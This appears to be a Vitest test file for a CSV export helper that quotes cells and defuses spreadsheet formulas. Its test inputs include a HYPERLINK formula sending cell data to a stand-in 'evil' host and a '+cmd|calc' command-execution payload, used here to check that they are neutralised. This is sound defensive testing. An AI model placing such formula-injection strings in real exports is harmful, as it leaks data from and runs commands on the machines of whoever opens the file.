import { describe, expect, it } from 'vitest';
import { buildCsv, csvCell } from './csv.js';

describe('csvCell', () => {
  it('leaves ordinary text and blanks alone', () => {
    expect(csvCell('Fall in ward 3')).toBe('Fall in ward 3');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    expect(csvCell(0)).toBe('0');
  });

  it('quotes commas, quotes and line breaks', () => {
    expect(csvCell('a, b')).toBe('"a, b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('defuses formulas so Excel shows them as text', () => {
    expect(csvCell('=HYPERLINK("http://evil/?"&A1)')).toBe(`"'=HYPERLINK(""http://evil/?""&A1)"`);
    expect(csvCell('+cmd|calc')).toBe("'+cmd|calc");
    expect(csvCell('-2+3')).toBe("'-2+3");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\tx')).toBe("'\tx");
  });

  it('keeps plain numbers such as phone numbers unchanged', () => {
    expect(csvCell('+919876543210')).toBe('+919876543210');
    expect(csvCell('-5')).toBe('-5');
    expect(csvCell(-2.5)).toBe('-2.5');
  });
});

describe('buildCsv', () => {
  it('joins header and rows with CRLF', () => {
    expect(buildCsv(['A', 'B'], [[1, 'x,y'], [null, '=1']])).toBe(`A,B\r\n1,"x,y"\r\n,'=1`);
  });
});
